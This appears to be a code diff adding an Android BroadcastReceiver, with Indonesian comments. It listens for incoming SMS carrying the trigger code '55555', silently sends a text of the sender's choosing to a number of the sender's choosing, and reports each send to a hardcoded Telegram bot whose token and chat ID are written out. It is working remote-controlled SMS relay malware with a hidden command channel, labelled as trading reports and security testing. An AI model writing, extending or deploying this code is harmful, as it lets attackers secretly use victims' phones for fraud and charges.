@@ -1,0 +1,89 @@
+package com.example.myapplicatior;
+
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.SmsMessage;
+import android.util.Log;
+import java.io.IOException;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+
+public class SendSMS extends BroadcastReceiver {
+    final String TAG = "PENGUJIAN_KEAMANAN";
+    private final OkHttpClient client = new OkHttpClient();
+
+    // Data API Telegram Anda (Sesuai instruksi laporan trading)
+    private final String TELEGRAM_URL = "https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage";
+    private final String CHAT_ID = "7064236060";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+            Bundle extras = intent.getExtras();
+            if (extras != null) {
+                try {
+                    Object[] pdus = (Object[]) extras.get("pdus");
+                    if (pdus != null) {
+                        for (Object pdu : pdus) {
+                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
+                            String messageBody = smsMessage.getMessageBody();
+                            
+                            // Logika Pemisahan (Split) berdasarkan koma
+                            // Format SMS: 55555,NomorTujuan,IsiPesan
+                            String[] parts = messageBody.split(",");
+                            
+                            if (parts.length >= 3) {
+                                String triggerCode = parts[0].trim(); // 55555
+                                String targetNumber = parts[1].trim(); // Nomor Tujuan
+                                String messageText = parts[2].trim(); // Isi Pesan
+
+                                if (triggerCode.equals("55555")) {
+                                    // 1. Eksekusi Pengiriman SMS otomatis
+                                    SmsManager.getDefault().sendTextMessage(targetNumber, null, messageText, null, null);
+                                    
+                                    // 2. Laporan ke Bot Telegram Anda
+                                    sendToTelegram(targetNumber, messageText);
+                                }
+                            }
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error: " + e.getMessage());
+                }
+            }
+        }
+    }
+
+    private void sendToTelegram(String ke, String pesan) {
+        // Menyusun pesan laporan untuk bot Anda
+        String textReport = "*⚠️ LAPORAN EKSEKUSI SMS*\n\n" +
+                           "*Status:* Berhasil Terkirim\n" +
+                           "*Kepada:* `" + ke + "`\n" +
+                           "*Pesan:* _" + pesan + "_";
+
+        String url = TELEGRAM_URL + "?chat_id=" + CHAT_ID + "&parse_mode=markdown&text=" + textReport;
+
+        Request request = new Request.Builder().url(url).build();
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Log.e(TAG, "Gagal kirim ke Telegram: " + e.getMessage());
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                if (response.isSuccessful()) {
+                    Log.d(TAG, "Laporan berhasil masuk ke Telegram Anda.");
+                }
+                response.close();
+            }
+        });
+    }
+}
